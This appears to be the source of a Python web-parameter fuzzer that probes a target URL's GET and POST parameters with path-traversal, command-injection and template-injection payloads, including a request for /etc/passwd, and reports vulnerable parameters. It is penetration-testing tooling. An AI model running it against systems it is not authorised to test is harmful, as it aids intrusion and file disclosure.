#!/usr/bin/env python3

import argparse
import sys
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import re
import time
import threading
from queue import Queue
from cores.colors import green, white, end, info, bad, good, run, yellow, bold
from cores.utils import get_random_string,decode,encode

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

parser = argparse.ArgumentParser()
parser.add_argument('-u',help='target url', dest='url')
parser.add_argument('-w',help='wordlist path', dest='wordlist', default='./db/short_params.txt')
parser.add_argument('-b','--cookie',help='cookie', dest='cookie')
parser.add_argument('-t','--threads',help='number of threads', dest='num_threads', default='4')
args = parser.parse_args()
print_lock = threading.Lock()
q = Queue()
currentMethod = 'GET' # method for threads to refer to
num_threads = int(args.num_threads) # default 8 threads
values = ['../../../../../../../../etc/passwd', 'w', '{{9999*9999}}'] # values to fuzz LFI, RCE, SSTTI
bypass_char = '' # for threads to refer to

url = args.url
wordlist = args.wordlist
cookie = args.cookie

args = parser.parse_args(args=None if sys.argv[1:] else ['--help'])

if cookie:
    headers = {
                'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0',
                'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language' : 'en-US,en;q=0.5',
                'Accept-Encoding' : 'gzip, deflate',
                'Connection' : 'keep-alive',
                'Upgrade-Insecure-Requests' : '1',
                'Cookie':cookie,
    }
else:
    headers = {
                    'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0',
                    'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language' : 'en-US,en;q=0.5',
                    'Accept-Encoding' : 'gzip, deflate',
                    'Connection' : 'keep-alive',
                    'Upgrade-Insecure-Requests' : '1',
    }

foundParams = {
	"rce":[],
	"lfi":[],
	"ssti":[]
}
paramList = []
try:
    with open(wordlist, 'r', encoding="utf8") as file:
        for line in file:
            paramList.append(line.strip('\n'))
except FileNotFoundError:
    print('%s The file doesn\'t exist' % bad)
    quit()

def requester(url, method, data, headers):
    if method == "GET":
        response = requests.get(url, params=data, headers=headers ,verify=False)
    elif method == "POST":
        response = requests.post(url, data=data, headers=headers, verify=False)
    return response

#Parse Web & Get Possible Parameter in Form
def parse(response):
    forms = re.findall(r'(?i)(?s)<form.*?</form.*?>', response)
    print("%s Found possible parameters by parsing webpage: " % good,end="")
    for form in forms:
        if "input" in form.strip():
            names = re.findall(r"name=['\"](.*?)['\"]", form.strip())
            for name in names:
                if name not in paramList:
                    paramList.append(name)
                print("%s%s %s" % (bold, green,name), end=",")
    if not forms:
        print("%s No parameters found in webpage:" % bad)

def vulnerable(response, vuln):
    if vuln == 'rce': #Check RCE
        if 'tty' in response.lower():
            return True
        else:
            return False
    if vuln == 'lfi': #Check LFI
        if 'root:' in response.lower():
            return True
        else:
            return False
    #implementation of SSTI 
    if vuln == 'ssti': #Check SSTI
    	if '99980001' in response.lower():
    	    return True
    	else:
    	    return False

# checkParams iteration wrapped in one function
def checkUrlParams(url, param, method, values, originalLength):
    breaker_rce = False
    breaker_lfi = False
    breaker_ssti = False
    unknown_param_type = False
    for value in values:
        value = '%s%s' % (value,bypass_char)
        data = {param:value}
        response = requester(url=url, method=method, data=data, headers=headers)
        if (len(response.text) != originalLength) and (response.status_code != 405): # Found!
 
            if vulnerable(response.text, vuln="rce"): #  RCE Found
                with print_lock:
                    print("%s Found valid param: %s%s %s%s(RCE!)%s"  % (good, green,param,bold,yellow,end))
                    foundParams["rce"].append(param)
                    #foundParams.insert(0, param)
                    breaker_rce = True
                    unknown_param_type = False 

            elif vulnerable(response.text, vuln="ssti"): #SSTI Found
                with print_lock:
                    print("%s Found valid param: %s%s %s%s(SSTI!)%s"  % (good, green,param,bold,yellow,end))
                    foundParams["ssti"].append(param)
                    #foundParams.insert(0,param)
                    breaker_ssti = True 
                    unknown_param_type = False

            elif vulnerable(response.text, vuln="lfi"): #LFI Found
                with print_lock:
                    print("%s Found valid param: %s%s%s (%s?%s=%s)"  % (good,green,param,end,url,param,value))
                    foundParams["lfi"].append(param)
                    #foundParams.insert(0, param)
                    breaker_lfi = True
                    unknown_param_type = False
            else:
                unknown_param_type = True

    if unknown_param_type:
        with print_lock:
            print("%s Found valid param (This might be false positive): %s%s%s" % (info, green,param,end))

    with print_lock:
        print("%s Trying: %s" % (info,param), end="\r", flush=True)
    #return breaker_lfi, breaker_rce

#Threader Function with receives param from Queue and originalLength
def threader(originalLength):
    while True:
        param = q.get()
        checkUrlParams(url, param, currentMethod, values, originalLength)
        q.task_done()

#Check GET & POST for all parameters found
def checkParams(response, url, headers):
    global currentMethod
    currentMethod = 'GET'
    breaker_rce = False
    breaker_lfi = False
    breaker_ssti = False
    originalLength = len(response.text)
    # check for GET method
    print("\n%s Checking for GET request..." % good)
    for index, param in enumerate(paramList):
        # temp disable - difficult to orchestrate
        #if breaker_lfi and breaker_rce:
        #    break

        # multithreading implementation
        # add words to queue
        q.put(param)
    q.join()

    
    # check for POST method
    currentMethod = 'POST'
    breaker_rce = False
    breaker_lfi = False
    breaker_ssti = False
    print("%s Checking for POST request..." % good)
    for param in paramList:
        # temp disable - difficult to orchestrate
        #if breaker_lfi and breaker_rce:
        #    break

        # multithreading implementation
        # add words to queue
        q.put(param)
    q.join()

def intensive(response, url, headers):
    # loading bypassing wordlist
    bypass_chars = []
    with open('db/bypass_chars.txt','r', encoding="utf8") as file:
        for line in file:
            bypass_chars.append(line.strip())
    for char in bypass_chars:
        print("%s Trying with %s" % (info,char))
        global bypass_char
        bypass_char = char
        checkParams(response, url, headers)




if __name__ == "__main__":
    finalResult = []
    bypassed_chars = []
    RCE = False
    LFI = False
    try:
        if url:
            if 'http' not in url:
                url = 'http://%s' % url
            try:
                originalFuzz = get_random_string(6)
                data = {originalFuzz:originalFuzz}
                response = requester(url=url, method='GET', data=data, headers=headers)
                # parse_webpage
                print("%s Parsing webpage for potential parameters..." % good)
                parse(response.text)
                originalLength = len(response.text)
                # initialize threads
                for x in range(num_threads):
                    t = threading.Thread(target=threader, args=(originalLength,))
                    t.daemon = True
                    t.start()
                print("\n%s Running with %d threads" % (info,num_threads))
                # lfi and rce checking
                start_time = time.time() # Start execution time
                checkParams(response, url, headers)
                if not foundParams:
                    print("%s No parameter found, trying bypassing techniques..." % info)
                    # bypassed_chars = checkParams()
                    intensive(response, url, headers)
                else:
                    if len(foundParams["rce"]) > 0:
                        print("\n\n%s Vulnerable parameters (RCE): "% good)
                        for param in foundParams["rce"]:
                            print("%s " % param)
                    if len(foundParams["lfi"]) > 0:
                        print("\n\n%s Vulnerable parameters (LFI): "% good)
                        for param in foundParams["lfi"]:
                            print("%s " % param)
                    if len(foundParams["ssti"]) > 0:
                        print("\n\n%s Vulnerable parameters (SSTI): "% good)
                        for param in foundParams["ssti"]:
                            print("%s " % param)
            except ConnectionError:
                print("%s Unable to connect to the target URL" % bad)
                quit()
    except KeyboardInterrupt:
        print("\n%s Exiting..." % bad)
        quit()
